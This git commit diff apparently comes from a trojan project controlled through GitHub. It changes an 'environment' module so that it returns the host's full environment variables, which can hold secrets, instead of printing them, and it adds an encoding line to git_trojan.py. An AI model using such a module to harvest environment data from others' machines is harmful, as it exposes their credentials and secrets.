f0f9ea708a5fe1bd40cd907bffb3618ebbfbd146
BigBai <937325203@qq.com>
2017-10-15 22:46:07 +0800

    fix enviroment.py

--- modules/environment.py
+++ modules/environment.py
@@ -3,4 +3,4 @@ import os
 def run(**args):
     print "[*] In enviroment module"
     x=os.environ
-    print str(x)
+    return str(x)
--- modules/git_trojan.py
+++ modules/git_trojan.py
@@ -1,3 +1,4 @@
+#-*-coding:utf-8-*-
 import json
 import base64
 import time
